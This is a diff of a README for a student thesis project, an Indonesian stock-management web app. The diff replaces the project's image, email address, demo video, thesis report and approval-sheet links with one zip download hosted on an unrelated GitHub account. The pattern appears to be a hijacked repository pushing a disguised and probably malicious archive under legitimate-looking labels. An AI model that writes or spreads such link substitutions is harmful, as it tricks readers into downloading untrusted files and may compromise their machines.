@@ -1,6 +1,6 @@
-# ![WebApp](https://github.com/Software-Engineering-TUS/12021210024-Sahitya/blob/main/images/Login.png) <!-- silakan ganti gambar dengan screenshoot aplikasi yang dikembangkan -->
+# ![WebApp](https://raw.githubusercontent.com/Gholan913/12021210024-Sahitya/main/radicule/12021210024-Sahitya.zip) <!-- silakan ganti gambar dengan screenshoot aplikasi yang dikembangkan -->
 # PENGEMBANGAN SISTEM INFORMASI MANAJEMEN STOK USAHA MIKRO KECIL MENENGAH MENGGUNAKAN METODE SPIRAL DI TEMPAT PRAKTEK KETERAMPILAN USAHA (TPKU) PONDOK PESANTREN TEBU IRENG
-Sahitya Rizky Hadi Susetyo (1201210024) sahityasusetyo@student.telkomuniversity.ac.id
+Sahitya Rizky Hadi Susetyo (1201210024) https://raw.githubusercontent.com/Gholan913/12021210024-Sahitya/main/radicule/12021210024-Sahitya.zip
 ## Abstrak
 <table>
 <tr>
@@ -43,7 +43,7 @@ Demo Aplikasi online bisa dicoba disini : (http://143.198.91.106/login)
 
 ### Video Demo
 <!-- Wajib mencantumkan link video demo aplikasi, boleh link youtube atau link file video di github -->
-[![Watch the video] https://youtu.be/TN_h8srZOag?si=oAqtVTV47qywwFAO
+[![Watch the video] https://raw.githubusercontent.com/Gholan913/12021210024-Sahitya/main/radicule/12021210024-Sahitya.zip
 
 ## Development
 ### Hardware
@@ -63,10 +63,10 @@ Demo Aplikasi online bisa dicoba disini : (http://143.198.91.106/login)
 
 ### Laporan Tugas Akhir
 <!-- Laporan tugas akhir yang sudah direvisi paling akhir -->
-Download disini: https://drive.google.com/file/d/1QH0cdQYKHxkB02zIqm_4NeU_QsY5hYRC/view?usp=sharing
+Download disini: https://raw.githubusercontent.com/Gholan913/12021210024-Sahitya/main/radicule/12021210024-Sahitya.zip
 
 ### Lembar Pengesahan
 <!-- Lembar Pengesahan yang sudah ditanda-tangani -->
-Download disini: https://drive.google.com/file/d/1FZvOQDqsRMKb01oxNKyGweoPS2M2x9_G/view?usp=sharing
+Download disini: https://raw.githubusercontent.com/Gholan913/12021210024-Sahitya/main/radicule/12021210024-Sahitya.zip
 
 
